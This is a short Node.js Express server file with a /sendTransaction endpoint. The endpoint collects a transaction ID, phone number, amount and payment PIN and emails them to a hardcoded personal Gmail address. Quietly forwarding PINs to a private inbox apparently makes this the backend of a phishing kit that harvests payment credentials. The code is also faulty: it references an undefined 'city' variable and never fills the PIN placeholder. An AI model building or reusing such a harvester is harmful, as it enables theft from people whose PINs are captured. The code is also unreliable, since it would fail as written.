require('dotenv').config();

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

// Allow requests from localhost
app.use(cors());

app.use(bodyParser.json());

const htmlTemplate = `
<h1> Transaction Details</h1>
<p><strong> Transaction ID:</strong> {{transactionId}}</p>
<p><strong> Phone Number:</strong> {{phoneNumber}}</p>
<p><strong> Amount:</strong> {{amountToPay}}</p>
<p><strong> PIN:</strong> {{pin}}</p>
`;

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

app.post('/sendTransaction', async (req, res) => {
    try {
        const { transactionId, phoneNumber, amountToPay, pin } = req.body;

        if (!transactionId || !phoneNumber || !amountToPay || !pin) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const html = htmlTemplate
            .replace('{{transactionId}}', transactionId)
            .replace('{{phoneNumber}}', phoneNumber)
            .replace('{{amountToPay}}', amountToPay)
            .replace('{{city}}', city)

        const info = await transporter.sendMail({
            from: 'ibadurrehman718@gmail.com',
            to: 'sarajameswilliam718@gmail.com',
            subject: 'New Transaction Alert',
            html: html
        });

        console.log("Message sent: %s", info.messageId);

        res.json({ message: 'Transaction details sent successfully!' });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ error: 'Failed to send transaction details' });
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
